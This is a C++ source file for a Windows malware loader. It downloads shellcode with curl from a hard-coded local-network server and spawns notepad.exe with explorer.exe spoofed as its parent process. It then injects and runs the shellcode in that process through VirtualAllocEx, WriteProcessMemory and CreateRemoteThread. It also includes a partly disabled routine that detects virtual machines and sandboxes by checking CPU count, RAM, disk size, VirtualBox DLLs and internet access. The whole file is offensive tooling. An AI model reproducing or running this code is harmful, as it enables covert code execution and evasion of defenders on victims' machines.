// Cr0codil.cpp : Ten plik zawiera funkcję „main”. W nim rozpoczyna się i kończy wykonywanie programu.
//

#include <iostream>
#include <windows.h>
#include <IPHlpApi.h>
#include <winhttp.h>
#include <stdlib.h>
#include <string.h>
#include <Psapi.h>
#include <stdio.h>
#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "IPHlpApi.lib")


bool dynamicAnalysisCheck();



int main()
{
    FILE* fpipe;
    const char* command = "curl http://192.168.0.32:8000/payload.bin";
    char c = 0;
    char shellcode[510]; //set real payload size
    int counter = 0;
    if (0 == (fpipe = (FILE*)_popen(command, "r"))) {
        perror("popen() failed.\n");
        exit(EXIT_FAILURE);
    }
    while (fread(&c, sizeof c, 1, fpipe)) {
        shellcode[counter] = c;
        printf("%c", c);
        counter++;
    }
    _pclose(fpipe);

    DWORD runningProcessesIDs[1024];
    DWORD runningProcessesCountBytes;
    DWORD runningProcessesCount;
    HANDLE hExplorerexe = NULL;

    EnumProcesses(runningProcessesIDs, sizeof(runningProcessesIDs), &runningProcessesCountBytes);
    runningProcessesCount = runningProcessesCountBytes / sizeof(DWORD);

    for (int i = 0; i < runningProcessesCount; i++) {
        if (runningProcessesIDs[i] != 0) {
            HANDLE hProcess = OpenProcess(MAXIMUM_ALLOWED, FALSE, runningProcessesIDs[i]);
            char processName[MAX_PATH + 1];
            DWORD size = GetModuleFileNameExA(hProcess, 0, processName, MAX_PATH);
            processName[size] = '\0'; // Ensure the string is null-terminated
            _strlwr_s(processName);
            if (strstr(processName, "explorer.exe") && hProcess) {
                hExplorerexe = hProcess;
            }
        }
    }


    bool checkStatus = dynamicAnalysisCheck();
    if (1 == 0) //IsDebuggerPresent() == true && checkStatus == false
    {
        printf("Dynamic analysis check returned VM or debugger presence. Exiting...\n");
        return 0;
    }
    else {
        // Create a new process (Notepad.exe) with explorer.exe as its parent process

        STARTUPINFOEXA si;
        PROCESS_INFORMATION pi;
        SIZE_T attributeSize;
        RtlZeroMemory(&si, sizeof(STARTUPINFOEXA));
        RtlZeroMemory(&pi, sizeof(PROCESS_INFORMATION));

        InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
        si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)new byte[attributeSize]();
        InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);
        UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hExplorerexe, sizeof(HANDLE), NULL, NULL);
        si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

        if (!CreateProcessA("C:\\Windows\\notepad.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
            printf("Failed to create process. Error: %d\n", GetLastError());
            return 1;
        }

        printf("Process created with PID: %d\n", pi.dwProcessId);

        // Inject and execute the shellcode in the new process
        void* exec = VirtualAllocEx(pi.hProcess, 0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (!exec) {
            printf("VirtualAllocEx failed. Error: %d\n", GetLastError());
            return 1;
        }

        SIZE_T written;
        if (!WriteProcessMemory(pi.hProcess, exec, shellcode, sizeof(shellcode), &written)) {
            printf("WriteProcessMemory failed. Error: %d\n", GetLastError());
            return 1;
        }

        HANDLE hThread = CreateRemoteThread(pi.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
        if (!hThread) {
            printf("CreateRemoteThread failed. Error: %d\n", GetLastError());
            return 1;
        }

        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);

        VirtualFreeEx(pi.hProcess, exec, 0, MEM_RELEASE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }

    return 0;
}
bool dynamicAnalysisCheck() {
    // check CPU
    SYSTEM_INFO systemInfo;
    GetSystemInfo(&systemInfo);
    DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
    if (numberOfProcessors < 2) return false;

    // check RAM
    MEMORYSTATUSEX memoryStatus;
    memoryStatus.dwLength = sizeof(memoryStatus);
    GlobalMemoryStatusEx(&memoryStatus);
    DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
    if (RAMMB < 2048) return false;

    // check HDD
    HANDLE hDevice = CreateFileW(L"\\\\.\\PhysicalDrive0", 0, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    DISK_GEOMETRY pDiskGeometry;
    DWORD bytesReturned;
    DeviceIoControl(hDevice, IOCTL_DISK_GET_DRIVE_GEOMETRY, NULL, 0, &pDiskGeometry, sizeof(pDiskGeometry), &bytesReturned, (LPOVERLAPPED)NULL);
    DWORD diskSizeGB;
    diskSizeGB = pDiskGeometry.Cylinders.QuadPart * (ULONG)pDiskGeometry.TracksPerCylinder * (ULONG)pDiskGeometry.SectorsPerTrack * (ULONG)pDiskGeometry.BytesPerSector / 1024 / 1024 / 1024;
    if (diskSizeGB < 100) return false;
    // check files
    WIN32_FIND_DATAW findFileData;
    if (FindFirstFileW(L"C:\\Windows\\System32\\VBox*.dll", &findFileData) != INVALID_HANDLE_VALUE) return false;

    // check registry key

    // check internet connection
    HINTERNET hSession = WinHttpOpen(L"Mozilla 5.0", WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    HINTERNET hConnection = WinHttpConnect(hSession, L"google.com", INTERNET_DEFAULT_HTTP_PORT, 0);
    HINTERNET hRequest = WinHttpOpenRequest(hConnection, L"GET", L"test", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, NULL);
    WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, 0);
    DWORD responseLength;
    WinHttpQueryDataAvailable(hRequest, &responseLength);
    PVOID response = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, responseLength + 1);
    WinHttpReadData(hRequest, response, responseLength, &responseLength);
  //  if (atoi((PSTR)response) != 1337) return false;



}

// Uruchomienie programu: Ctrl + F5 lub menu Debugowanie > Uruchom bez debugowania
// Debugowanie programu: F5 lub menu Debugowanie > Rozpocznij debugowanie

// Porady dotyczące rozpoczynania pracy:
//   1. Użyj okna Eksploratora rozwiązań, aby dodać pliki i zarządzać nimi
//   2. Użyj okna programu Team Explorer, aby nawiązać połączenie z kontrolą źródła
//   3. Użyj okna Dane wyjściowe, aby sprawdzić dane wyjściowe kompilacji i inne komunikaty
//   4. Użyj okna Lista błędów, aby zobaczyć błędy
//   5. Wybierz pozycję Projekt > Dodaj nowy element, aby utworzyć nowe pliki kodu, lub wybierz pozycję Projekt > Dodaj istniejący element, aby dodać istniejące pliku kodu do projektu
//   6. Aby w przyszłości ponownie otworzyć ten projekt, przejdź do pozycji Plik > Otwórz > Projekt i wybierz plik sln
